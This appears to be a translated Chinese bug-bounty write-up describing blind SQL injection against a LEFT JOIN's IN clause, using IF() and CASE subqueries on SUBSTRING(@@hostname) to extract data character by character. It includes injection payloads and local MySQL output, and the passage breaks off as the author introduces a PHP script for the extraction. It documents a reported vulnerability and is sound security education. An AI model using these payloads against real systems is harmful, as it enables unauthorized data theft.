这种行为和关系是在 `widgets`和 `assets`之间，我假设查询语句像下面的那样。

```
1.  `SELECT  `
    
2.  `    w.id,  `
    
3.  `    w.name,  `
    
4.  `    a.type_id  `
    
5.  `FROM widgets w  `
    
6.  `LEFT JOIN assets a ON (  `
    
7.  `    a.widget_id = w.id  `
    
8.  `    AND a.type_id IN ($IDS)  `
    
9.  `)  `
    
10.  `...more SQL...`
     
```

我很确定它是 `LEFT JOIN`语法,因为总是返回相同数量的 `widgets`，只有附加到它们的 `assets`数量会因参数而异;我很确定在JOIN之后还有更多的SQL语句（一个LIMIT，ORDER BY，另一个JOIN或类似的东西），这就是阻止我之前尝试注入UNION语句的原因。

没有办法直接注入出数据，不知道该怎么办了？

我的第一个想法是，利用常见的盲注方法， `if(expression,true,false)`语句查询正确与否。如果我提供的ID为2，将会有 `assert`依附在 `widgets`，如果我提供的ID为1，那就没有 `assets`。至少在理论上，我可以使用子查询作为我的 `payload`，返回2代表True，1表示false。如果返回中有 `assets`的话，那代表 `True`，否则代表 `False`。

我决定通过一些简单的方法来测试理论猜想：数据库服务器的主机名。Mysql服务器上的主机名存储在 `hostname`变量中，可以很容易的看到它。

```
1.  `mysql> SELECT @@hostname;  `
    
2.  `+------------+  `
    
3.  `| @@hostname |  `
    
4.  `+------------+  `
    
5.  `| girru      |  `
    
6.  `+------------+  `
    
7.  `1 row in set (0.00 sec)`
    
```

这些例子是在我本地机器上运行的，我一直认为在本地机器上做测试是一个好的方法，而不是盲目的在实际环境中找问题，没有真实的反馈或错误信息。

因为我只能测试yes/no问题，查看主机名的第一个字符是 `a`,或者 `b`和 `c`，以此类推，直到找到正确的字符。然后我再找第二个字符，可以使用 `substring`函数。

```
1.  `mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = "a", 2, 1);  `
    
2.  `+---------------------------------------------+  `
    
3.  `| IF(SUBSTRING(@@hostname, 1, 1) = "a", 2, 1) |  `
    
4.  `+---------------------------------------------+  `
    
5.  `|                                           1 |  `
    
6.  `+---------------------------------------------+  `
    
7.  `1 row in set (0.00 sec)`
    
```

请记住：结果中的1表示“否”，2表示“是”。

在我的报告中，我说会导致数据泄露，虽然速度有点慢，但很容易编写脚本。 怎么能快速的获取数据呢？我们需要超过二阶查询，超过三阶查询甚至更多。我们可以使用 `case`语法。

`CASE`语句允许您执行以下操作：

```
1.  `mysql> SELECT CASE SUBSTRING(@@hostname, 1, 1)  `
    
2.  `    ->     WHEN "a" THEN 1  `
    
3.  `    ->     WHEN "b" THEN 2  `
    
4.  `    ->     WHEN "c" THEN 3  `
    
5.  `    ->     WHEN "d" THEN 4  `
    
6.  `    ->     WHEN "e" THEN 5  `
    
7.  `    ->     WHEN "f" THEN 6  `
    
8.  `    ->     WHEN "g" THEN 7  `
    
9.  `    ->     ...  `
    
10.  `    ->     WHEN "z" THEN 26  `
     
11.  `    -> END as result;  `
     
12.  `+--------+  `
     
13.  `| result |  `
     
14.  `+--------+  `
     
15.  `|      7|  `
     
16.  `+--------+  `
     
17.  `1 row in set (0.00 sec)`
     
```

因为结果是7，所以我知道第一个字符是g。

这里的一个小问题。我不能从1到26的字母去注入得到数据，因为并非所有可能的ID都有相应的 `assets`。我需要找到足够的有效ID来完成这项工作。

我写了一个小PHP脚本，以免我输入从1到100的数字，并尝试传入1,2,3 ... 99,100作为参数。我使用了一些命令行技巧来查找所有唯一有效ID的列表：
